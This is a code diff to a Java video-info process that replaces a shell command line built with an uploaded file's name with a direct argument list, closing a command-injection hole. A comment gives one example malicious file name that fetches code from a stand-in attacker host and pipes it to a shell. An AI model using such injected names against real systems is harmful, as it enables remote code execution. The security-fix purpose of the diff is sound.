@@ -23,6 +23,7 @@ import com.google.gson.reflect.TypeToken;
 import org.structr.common.SecurityContext;
 import org.structr.util.AbstractProcess;
 
+import java.util.List;
 import java.util.LinkedHashMap;
 import java.util.Map;
 
@@ -46,14 +47,26 @@ public class GetVideoInfoProcess extends AbstractProcess<Map<String, Object>> {
 	public void preprocess() {
 	}
 
+	/**
+	 * The path is a file path, and in a mounted folder it carries the file name, which a non-admin can
+	 * choose - an upload with content type video/* types the file to VideoFile and OnUploadCompletion
+	 * calls this. Through a shell, a name like "x;curl attacker|sh;.mp4" was a command. As arguments it
+	 * is a file name that ffprobe will simply not find.
+	 *
+	 * <p>The "if [ -x $(which ffprobe) ]" guard this replaces was shell syntax and is gone with the
+	 * shell; a missing ffprobe now surfaces as an IOException from the process start, which call()
+	 * logs, instead of an empty successful run.
+	 */
+	@Override
+	public List<String> getCommandArguments() {
+
+		return List.of("ffprobe", "-v", "verbose", "-show_format", "-show_streams", "-of", "json", path);
+	}
+
 	@Override
 	public StringBuilder getCommandLine() {
 
-		StringBuilder commandLine = new StringBuilder("if [ -x \"$(which ffprobe)\" ]; then ffprobe -v verbose -show_format -show_streams -of json ");
-		commandLine.append(path);
-		commandLine.append("; fi;");
-
-		return commandLine;
+		return null;
 	}
 
 	@Override
